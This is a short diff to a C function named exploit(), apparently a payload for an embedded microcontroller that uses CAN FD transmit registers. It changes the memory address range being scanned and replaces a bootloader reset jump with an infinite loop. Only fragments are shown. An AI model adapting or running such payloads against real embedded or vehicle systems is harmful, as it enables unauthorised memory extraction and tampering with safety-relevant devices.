@@ -10,8 +10,8 @@ void exploit() {
 
     asm("di");
 
-    int *addr = 0xfebe6e34;
-    while (addr < 0xfebe6ff4) {
+    int *addr = 0xff200000;
+    while (addr < 0xff208000) {
         int i = 0x10;
 
         if ((*(RSCFDnCFDTMSTSp + i) & 0b110) != 0) {
@@ -45,6 +45,10 @@ void exploit() {
         addr++;
     }
 
-    void (*bl_reset)(void) = (void (*)(void))0x0000157e;
-    bl_reset();
+    while (1) {
+        ;
+    }
+
+    // void (*bl_reset)(void) = (void (*)(void))0x0000157e;
+    // bl_reset();
 }
